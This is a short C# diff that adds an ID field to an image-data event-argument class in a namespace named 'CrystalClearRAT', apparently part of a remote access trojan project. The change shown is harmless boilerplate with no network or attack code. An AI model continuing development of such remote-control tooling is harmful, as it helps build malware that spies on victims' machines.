@@ -9,10 +9,12 @@ namespace CrystalClearRAT.Event
     class ImageArgs : EventArgs
     {
         public byte[] Data;
+        public string ID;
 
-        public ImageArgs(byte[] data)
+        public ImageArgs(byte[] data, string id)
         {
             this.Data = data;
+            ID = id;
         }
     }
 }
